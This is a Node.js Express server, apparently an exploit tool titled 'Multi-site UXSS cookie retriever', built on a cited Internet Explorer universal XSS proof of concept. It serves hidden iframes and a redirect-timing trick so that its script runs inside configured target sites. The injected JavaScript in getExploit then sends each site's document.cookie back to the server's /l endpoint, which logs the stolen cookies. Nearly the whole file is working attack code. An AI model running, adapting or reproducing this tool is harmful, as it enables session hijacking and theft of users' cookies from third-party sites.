// File: app.js
// Author: l0th (Daniele Bellavista)
// Email: daniele.bellavista@gmail.com
//
// -*- coding: utf-8 -*-
// vim:fenc=utf-8
// vim:foldmethod=syntax
// vim:foldnestmax=1
//
// jslint es5: true
"use strict;";

var conf = require('./conf');
var targets = conf.targets;
var onFinished = require('on-finished');
var thisHost = conf.host;
var express = require('express');
var url = require('url');
var cookie = require('cookie');

var app = express();

app.use(function(req, res, next) {
  res.header("Cache-Control", "no-cache, no-store, must-revalidate");
  res.header("Pragma", "no-cache");
  res.header("Expires", 0);
  next();
});

var exploitObj = {};

function doRedirect(rand) {
  exploitObj[rand].redRes.redirect(exploitObj[rand].redUrl);

  onFinished(exploitObj[rand].redRes, function (err, res) {
    doWait(rand);
  });
}

function doWait(rand) {
  setTimeout(function() {
    exploitObj[rand].waiRes.send('');
    onFinished(exploitObj[rand].waiRes, function(err, res) {
      delete exploitObj[rand];
    });
  }, 500);
}

function create(rand) {
  exploitObj[rand] = {
    rDone: false,
    waiRes: null,
    redRes: null,
    redUrl: null
  };
}

app.get('/r/:rand/:id', function(req, res, next) {

  var id = parseInt(req.params.id);
  var rand = req.params.rand;
  if (!exploitObj[rand]) create(rand);

  exploitObj[rand].redRes = res;
  exploitObj[rand].redUrl = targets[id];

  if (exploitObj[rand].waiRes) {
    doRedirect(rand);
  }
});

app.get('/d/:rand/:id', function(req, res, next) {
  var id = parseInt(req.params.id);
  var rand = req.params.rand;
  if (!exploitObj[rand]) create(rand);

  exploitObj[rand].waiRes = res;

  if (exploitObj[rand].redRes) {
    doRedirect(rand);
  }
});

app.get('/l', function(req, res, next) {
  res.send('');

  var u = url.parse(req.url);
  var s = /_id=(\d+)\|(.*)/.exec(u.query);
  var cs = cookie.parse(unescape(s[2]));

  console.log(targets[parseInt(s[1])]);
  console.log(JSON.stringify(cs, null, ' '));
});

function getExploit(rand, id) {
  return 'frames[0].eval(\'_=parent.frames[1];with(new XMLHttpRequest())open("get","' + thisHost + '/d/' + rand + '/' + id + '",false),send();_.location="javascript:bkp=\\\'' + thisHost + '/l?_id=' + id + '|\\\'+document.cookie;window.location(bkp);"\');';
}

app.get('/exploit/:rand/:id', function(req, res, next) {
  var id = parseInt(req.params.id);
  var rand = req.params.rand;
  var page = [
    '<iframe style="display:none" src="/r/' + rand + '/' + id + '"></iframe>',
    '<iframe style="display:none" src="' + targets[id] + '"></iframe>',
    '<script>',
    getExploit(rand, id),
    '</script>'
  ];
  res.send(page.join('\n'));
});

app.use(function(req, res, next) {
  var page = [
    "<!DOCTYPE html><html><head><title>Multi-site UXSS cookie retriever</title></head><body>"
  ];
  page.push('<h1>Multi-size UXSS cookie retriever</h1>');
  page.push('<p>You can read this content while the page does its work.</p>');
  page.push('<p>Original exploit: http://www.deusen.co.uk/items/insider3show.3362009741042107/</p>');
  page.push('<p>Further POC: http://packetstormsecurity.com/files/130308/Microsoft-Internet-Explorer-Universal-XSS-Proof-Of-Concept.html</p>');


  for (var k = 0; k < targets.length; k++) {
    page.push('<iframe style="display:none" id="iframe' + k + '"></iframe>');
  }

  page.push('<script>function loadAll() {');
  for (var i = 0; i < targets.length; i++) {
    var rand = ('' + Math.random()).split('.')[1];
    page.push('var ifr = document.getElementById("iframe' + i + '"); ifr.src = "/exploit/' + rand + '/' + i + '";');
  }
  page.push('} setTimeout(loadAll, 5);');
  page.push('</script></body></html>');

  res.send(page.join('\n'));
});

app.use(function(err, req, res, next) {
  console.error(err.stack);
  res.send('');
});

var http = require('http');
var server = http.createServer(app);
server.listen(8080);
